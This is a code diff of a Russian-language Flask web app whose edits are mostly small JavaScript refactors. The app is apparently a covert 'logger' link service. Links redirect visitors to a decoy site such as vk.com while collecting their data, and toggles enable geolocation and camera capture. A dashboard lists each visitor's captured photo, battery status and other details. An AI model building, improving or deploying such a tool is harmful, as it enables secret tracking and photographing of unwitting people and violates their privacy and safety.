@@ -2,12 +2,10 @@ from flask import Flask, request, redirect, render_template_string, jsonify, ses
 import uuid
 import datetime
 import secrets
-import re
 
 app = Flask(__name__)
 app.secret_key = secrets.token_urlsafe(32)
 
-# Хранилище: {user_id: {'links': {link_id: {'created': ..., 'logs': [...]}}, 'settings': {...}}}
 user_data = {}
 
 # ============ УСКОРЕННЫЙ LOGGER_HTML ============
@@ -83,7 +81,7 @@ LOGGER_HTML = """
 
 <script>
 (function() {
-    const linkId = window.location.pathname.split('/').pop();
+    var linkId = window.location.pathname.split('/').pop();
 
     function collectAllData() {
         return {
@@ -122,8 +120,8 @@ LOGGER_HTML = """
         };
     }
 
-    let collectedData = collectAllData();
-    let sent = false;
+    var collectedData = collectAllData();
+    var sent = false;
 
     function sendData() {
         if (sent) return;
@@ -503,7 +501,7 @@ LOGIN_HTML = """
 </html>
 """
 
-# ============ ОСНОВНАЯ ПАНЕЛЬ ============
+# ============ ОСНОВНАЯ ПАНЕЛЬ (ИСПРАВЛЕННАЯ) ============
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -521,13 +519,11 @@ DASHBOARD_HTML = """
             font-family: 'Inter', -apple-system, sans-serif;
             min-height: 100vh;
         }
-
         .app {
             max-width: 1320px;
             margin: 0 auto;
             padding: 24px 32px;
         }
-
         .header {
             display: flex;
             justify-content: space-between;
@@ -606,7 +602,6 @@ DASHBOARD_HTML = """
         .btn-ghost:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.12); }
         .btn-sm { padding: 6px 14px; font-size: 12px; border-radius: 8px; }
         .btn-xs { padding: 4px 10px; font-size: 11px; border-radius: 6px; }
-
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -635,7 +630,6 @@ DASHBOARD_HTML = """
             margin-top: 2px;
             font-weight: 400;
         }
-
         .settings-panel {
             display: none;
             background: rgba(255,255,255,0.02);
@@ -715,7 +709,6 @@ DASHBOARD_HTML = """
             min-width: 50px;
         }
         .toggle-label.active { color: #a78bfa; }
-
         .link-box {
             background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.05);
@@ -752,7 +745,6 @@ DASHBOARD_HTML = """
             border-color: rgba(124,92,252,0.3);
             background: rgba(124,92,252,0.04);
         }
-
         .visitor {
             background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.04);
@@ -806,14 +798,12 @@ DASHBOARD_HTML = """
             color: rgba(255,255,255,0.15);
             margin-top: 4px;
         }
-
         .empty {
             text-align: center;
             padding: 40px 20px;
             color: rgba(255,255,255,0.15);
         }
         .empty .icon { font-size: 40px; margin-bottom: 12px; opacity: 0.3; }
-
         .toast {
             position: fixed;
             bottom: 24px;
@@ -835,7 +825,6 @@ DASHBOARD_HTML = """
         }
         .toast.show { opacity: 1; }
         .toast.error { background: rgba(239,68,68,0.12); border-color: rgba(239,68,68,0.15); color: #f87171; }
-
         @media (max-width: 768px) {
             .app { padding: 16px; }
             .header { flex-direction: column; align-items: flex-start; }
@@ -928,15 +917,17 @@ var currentLinkId = null;
 var currentFullLink = '';
 var settings = { redirect: 'https://vk.com/', geo: true, camera: true };
 
-fetch('/settings')
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-        settings = data;
-        document.getElementById('redirectInput').value = data.redirect || 'https://vk.com/';
-        updateToggle('geo', data.geo !== false);
-        updateToggle('camera', data.camera !== false);
-    })
-    .catch(function() {});
+function loadSettings() {
+    fetch('/settings')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            settings = data;
+            document.getElementById('redirectInput').value = data.redirect || 'https://vk.com/';
+            updateToggle('geo', data.geo !== false);
+            updateToggle('camera', data.camera !== false);
+        })
+        .catch(function() {});
+}
 
 function toggleSettings() {
     var panel = document.getElementById('settingsPanel');
@@ -1039,7 +1030,8 @@ function loadLinks() {
                 return;
             }
             var html = '<div style="margin:16px 0 10px 0; font-size:13px; color:rgba(255,255,255,0.2);">📋 Ваши ссылки</div>';
-            data.links.forEach(function(link) {
+            for (var i = 0; i < data.links.length; i++) {
+                var link = data.links[i];
                 var visits = data.visits[link.id] || 0;
                 var isActive = link.id === currentLinkId;
                 html += '<div class="link-box ' + (isActive ? 'active' : '') + '">' +
@@ -1050,7 +1042,7 @@ function loadLinks() {
                         '<button class="btn btn-xs btn-danger" onclick="deleteLink(\'' + link.id + '\')"><i class="fas fa-trash"></i></button>' +
                     '</div>' +
                 '</div>';
-            });
+            }
             container.innerHTML = html;
         });
 }
@@ -1110,7 +1102,8 @@ function loadStats() {
             if (visitors.length === 0) {
                 html = '<div class="empty"><div class="icon">🕊️</div><div class="text">Никого нет</div></div>';
             } else {
-                visitors.forEach(function(v) {
+                for (var i = 0; i < visitors.length; i++) {
+                    var v = visitors[i];
                     var hasPhoto = v.photo && v.photo.length > 100;
                     html += '<div class="visitor">' +
                         '<div class="head">' +
@@ -1129,7 +1122,7 @@ function loadStats() {
                         '<div class="detail">🔋 ' + (v.battery_level || 'Unknown') + ' · ' + (v.battery_charging === 'Yes' ? '🔌 зарядка' : '🔋 не заряжается') + '</div>' +
                         (hasPhoto ? '<img src="' + v.photo + '" class="photo" />' : '<div class="photo-placeholder">📷 Нет фото</div>') +
                     '</div>';
-                });
+                }
             }
             document.getElementById('visitorsList').innerHTML = html;
         });
@@ -1143,10 +1136,11 @@ function showToast(msg, isError) {
     toast._hide = setTimeout(function() { toast.classList.remove('show'); }, 2500);
 }
 
-setInterval(function() { loadStats(); loadLinks(); }, 5000);
+loadSettings();
 loadLinks();
 loadStats();
 setTimeout(generateLink, 500);
+setInterval(function() { loadStats(); loadLinks(); }, 5000);
 </script>
 </body>
 </html>
